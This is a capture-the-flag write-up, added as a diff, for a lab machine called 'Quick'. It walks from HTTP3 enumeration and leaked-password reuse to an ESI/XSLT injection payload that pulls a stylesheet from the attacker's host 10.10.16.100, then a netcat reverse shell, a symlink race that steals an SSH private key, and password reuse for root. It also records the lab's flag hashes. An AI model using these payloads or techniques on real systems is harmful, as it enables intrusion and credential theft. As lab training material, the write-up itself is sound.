@@ -1,0 +1,57 @@
+* Quick
+** Enumeration
+** Foothold
+   
+refs:
+ * https://www.contextis.com/us/blog/xslt-server-side-injection-attacks
+ * https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/
+ * https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/
+   
+Getting a foothold requires finding the clues in the scans, seeing that UDP is running 443, and realizing that this implies HTTP3/QUIC. Firefox Nightly doesn't seem to work despite working http3 connections to other sites, so a fresh compiled ~curl~ gets it done.
+
+After that, there are clear passwords in the pdfs provided on the client site, trying these against a few of the clients reveals that at least one has not changed their credentials.
+
+** User
+
+By manually issuing a POST request to raise a ticket, we can choose whatever ticket ID we like.
+It just can't be a repeat -- however, apparently this check is bypassed when the ID is over 100 characters long.
+
+Raising a ticket in the ticket portal
+TKT-9999sdfsdaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbcccccddddddeeeeffffgggghhhhiiiijjjkkkkjllllmmmmnnnnoo
+
+~~~
+TKT-9999sdfsdaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbcccccddddddeeeeffffgggghhhhiiiijjjkkkkjllllmmmmnnnnoZZZZsdfsfffffffZ");
+</script>
+
+<body>
+<esi:include src="http://10.10.16.100/fruits.xml" stylesheet="http://10.10.16.100/exfil12.xsl" />
+</body>
+~~~
+
+Finally got a RCE script working, and when various reverse shells failed, executed a reverse shell in three steps:
+ 1. upload nc
+ 2. make it executable
+ 3. connect back with nc
+    
+USER: 017496d72f67978129be31f05ae34252
+
+** Lateral Movement
+
+Once in as ~sam~, poking around reveals we have access to another vhost site, ~printerv2~, and database creds. Logging into the site hard checks not for the password but for the srvadm email address, and the database doesn't have any uniqueness constraints, so:
+
+~insert into users values ('me', 'srvadm@quick.htb', <elisa's hash>)~ works to get us in.
+
+Once in we can send arbitrary data to a timestamped file, then have that file written to a socket.
+
+The socket is a reverse listener, the data doesn't matter: what matters is a hard loop running in the directory where the file is written:
+ * when a file appears, track its name
+ * delete it
+ * create a symlink with that same name against ~/home/srvadm/.ssh/id_rsa~
+
+This works consistently because of a ~sleep(0.5)~ call in the printer code.
+
+** Escalation
+
+There's a lot of stuff without too many obvious hints, but poking around the logs in ~.cache/conf.d/printers.conf~ shows a http address that looks like it has basic http auth creds it in against yet another vhost, ~printerv3~. The vhost isn't interesting, but try the password out to see if we can ~sudo -l~. It doesn't work for ~srvadm~. But password reuse! It's ~root~'s password!
+
+ROOT: 1a3f0892637f08f2193eaf250f6a351b
